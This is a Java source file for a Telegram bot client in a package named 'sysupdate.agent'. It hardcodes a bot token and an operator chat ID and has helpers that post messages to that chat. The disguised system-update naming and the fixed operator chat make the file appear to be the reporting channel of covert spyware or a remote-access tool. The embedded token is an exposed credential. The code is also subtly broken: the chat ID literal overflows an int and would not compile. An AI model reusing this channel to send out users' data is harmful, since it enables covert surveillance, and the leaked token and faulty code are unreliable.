package com.sysupdate.agent;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class TelegramClient {
    public static final String TOKEN = "8978224174:AAGS7qCDEbSAVexN2tKV3gR1x-QFU9MEEvI";
    public static final long ADMIN_ID = 7027935587; // ganti chat ID kamu

    private static final String BASE = "https://api.telegram.org/bot" + TOKEN + "/";

    public static String call(String method, String params) {
        HttpURLConnection c = null;
        try {
            URL u = new URL(BASE + method);
            c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(20000);
            c.setReadTimeout(30000);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            if (params != null && !params.isEmpty()) {
                OutputStream os = c.getOutputStream();
                os.write(params.getBytes(StandardCharsets.UTF_8));
                os.close();
            }
            InputStream is = c.getInputStream();
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = is.read(buf)) > 0) bo.write(buf, 0, n);
            is.close();
            return bo.toString("UTF-8");
        } catch (Exception e) {
            return "{\"ok\":false,\"err\":\"" + e.getMessage() + "\"}";
        } finally {
            if (c != null) c.disconnect();
        }
    }

    public static void sendMessage(long chatId, String text) {
        try {
            String p = "chat_id=" + chatId + "&text=" + URLEncoder.encode(text, "UTF-8");
            call("sendMessage", p);
        } catch (Exception ignored) {}
    }

    public static String enc(String s) {
        try { return URLEncoder.encode(s, "UTF-8"); } catch (Exception e) { return s; }
    }
}